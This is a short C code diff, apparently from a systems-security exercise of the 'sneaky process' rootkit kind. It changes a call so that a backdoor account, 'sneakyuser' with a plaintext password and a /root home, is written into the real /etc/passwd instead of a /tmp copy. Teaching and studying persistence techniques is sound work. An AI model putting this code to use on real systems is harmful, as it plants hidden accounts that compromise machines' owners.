@@ -39,7 +39,7 @@ int main(){
     if(copy_file("/etc/passwd","/tmp/passwd")==-1){
         return EXIT_FAILURE;
     }
-    if(add_to_pw("/tmp/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash")==-1){
+    if(add_to_pw("/etc/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash")==-1){
         return EXIT_FAILURE;
     }
 
